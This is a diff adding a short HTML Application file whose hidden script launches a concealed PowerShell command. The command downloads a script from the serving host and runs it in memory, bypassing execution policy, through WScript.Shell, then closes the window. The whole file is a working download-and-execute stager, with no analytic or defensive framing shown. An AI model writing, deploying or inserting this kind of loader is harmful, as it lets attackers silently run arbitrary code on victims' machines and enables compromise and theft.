@@ -1,0 +1,14 @@
+<html>
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<hta:application showintaskbar="no" windowstate="minimize" scroll="no" border="none"/>
+</head>
+<body>
+<script>
+var u = 'https://' + location.host + '/s?t=' + Math.random();
+var c = 'powershell -nop -w hidden -ep bypass -c "$s=(New-Object Net.WebClient).DownloadString(\'' + u + '\');[ScriptBlock]::Create($s).Invoke()"';
+new ActiveXObject('WScript.Shell').Run(c, 0, false);
+setTimeout(function(){ try{ window.close(); }catch(e){} }, 2500);
+</script>
+</body>
+</html>
